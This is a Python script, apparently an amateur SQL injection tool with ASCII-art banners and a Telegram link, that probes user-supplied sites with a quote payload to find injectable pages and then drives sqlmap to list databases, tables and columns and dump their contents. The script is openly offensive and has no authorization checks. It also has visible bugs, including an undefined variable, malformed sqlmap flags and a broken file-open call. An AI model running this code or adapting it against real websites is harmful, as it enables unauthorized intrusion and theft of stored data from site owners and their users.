import os 
import requests
import re
import random
import threading 
import platform
import webbrowser


uname = []
lists = []
page = open("dork.txt",'r').read().splitlines()
num_id = range(1, 100)
payload = "'"


def scanning():
    try: 

        http = input("\033[91m <<<<<[ENTER SITE]\n>>>> \033[94m")
        print("\n")
        if not "http" in http:
            http = f"http://{site}"
        for pg in page: 
            for ids in num_id:
                site_sql = f"{http}/{pg}{ids}{payload}"
                response = requests.get(site_sql)
                sqli_injection = f"{http}/{pg}{ids}"
                if response.status_code == 200:
                    source_code = response.text
                    if re.search(r"You have an error in your SQL syntax", source_code):
                        print(f"\033[1;31mYes SQLi : {sqli_injection}")
                        site = open('sites_sql.txt''a')
                        site.write (f"{sqli_injection}: SQL injection\n")
                        site.close()
                    else:
                        print(f"\033[1;31mNo SQLI : {sqli_injection}")
                else: 
                    continue
    except Exception as e: 
        print("Error URL : {}".format(e))

def exploit():
    site = input("\033[91m <<<<<[ENTER SITE]\n>>>> \033[94m")
    if not 'http' in site :
        site = f"http://{site}"
    http = site 
    for pg in page: 
        for ids in num_id:
            os.system("sqlmap - u {}{}{} --dbs --batch".format(http,pg,ids))
            db = input("\033[90m╔═══[Enter Database Name ]\n╚══>>>   \033[32m")
            os.system("sqlmap - u {} -D {} --tables".format(f"{http}{pg} {ids}",db))
            Table = input("\033[90m╔═══[Enter Table Name ]\n╚══>>>   \033[32m") 
            os.system("sqlmap -u {} -D {} -T {} --columns ".format(f"{http}{pg}{ids}", db, Table))
            dn = input("\033[1;31mDo you want to load the table or slot to load the table, type [d] :")
            if dn == "d":
                col = input("\033[1;31m[+] Write to me the name of the column you want to download : ")
                os.system("sqlmap -u {}  -D {} -T {} -C {} --dump".format(f"{http}{pg}{ids}", db, Table, col))
            else:
                d_all = input("\033[1;31mDo you want to download the entire database [y/n] : ")
                if d_all == "y":
                    os.system("sqlmap -u {} -D {} --dump".format(f"{http}{pg}{ids}", db))

def main(): 
    try: 
        username = os.getlogin()
        if username not in uname:
            webbrowser.open('https://t.me/Ox_zile')
            uname.append(str(username))
        if platform.system() == "Linux":
            os.system('clear')
        else: 
            os.system('clr')

        DevBlog = """ \033[1;94m
                                                                          
 @@@@@@  @@@  @@@          @@@@@@@@ @@@ @@@      @@@@@@@@ 
@@!  @@@ @@!  !@@               @@! @@! @@!      @@!      
@!@  !@!  !@@!@!              @!!   !!@ @!!      @!!!:!   
!!:  !!!  !: :!!            !!:     !!: !!:      !!:      
 : : ::  :::  ::: .......  :.::.: : :   : ::.: : : :: ::  
                  : :: : :                                
"""
        
        Scriptname = """\033[1;94m
            
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |    _______   | || |    ___       | || |   _____      | || |     _____    | || |  ________    | || |  _________   | || |  _________   | || |     ______   | || |     ____     | |
| |   /  ___  |  | || |  .'   '.     | || |  |_   _|     | || |    |_   _|   | || | |_   ___ `.  | || | |_   ___  |  | || | |  _   _  |  | || |   .' ___  |  | || |   .'    `.   | |
| |  |  (__ \_|  | || | /  .-.  \    | || |    | |       | || |      | |     | || |   | |   `. \ | || |   | |_  \_|  | || | |_/ | | \_|  | || |  / .'   \_|  | || |  /  .--.  \  | |
| |   '.___`-.   | || | | |   | |    | || |    | |   _   | || |      | |     | || |   | |    | | | || |   |  _|  _   | || |     | |      | || |  | |         | || |  | |    | |  | |
| |  |`\____) |  | || | \  `-'  \_   | || |   _| |__/ |  | || |     _| |_    | || |  _| |___.' / | || |  _| |___/ |  | || |    _| |_     | || |  \ `.___.'\  | || |  \  `--'  /  | |
| |  |_______.'  | || |  `.___.\__|  | || |  |________|  | || |    |_____|   | || | |________.'  | || | |_________|  | || |   |_____|    | || |   `._____.'  | || |   `.____.'   | |
| |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
          [1] EXPLOIT SQLI         [2] SCANING SQL INJECTION
        """
        print(DevBlog)
        print(Scriptname)

        sqli = input("\033[90m<<<<{root@Zile}\n>>>> \033[32m")
        if sqli == '1':
            threading.Thread(target=exploit).start()
        if sqli == '2':
            threading.Thread(target=scanning).start()
    except Exception as s :
        print("Error : {s}".format(s))

def login():
    try:
        sami_ch = open("ch.txt", 'r').read().splitlines()
        if 'ok' in sami_ch:
            username = os.getlogin()
            uname.append(str(username))
            main()
    except: 
         sami = open("ch.txt",'w')
         sami.write('ok')
         sami.close()
         webbrowser.open('https://t.me/Ox_zile')
         username = os.getlogin()
         uname.append(str(username))
         main()
login()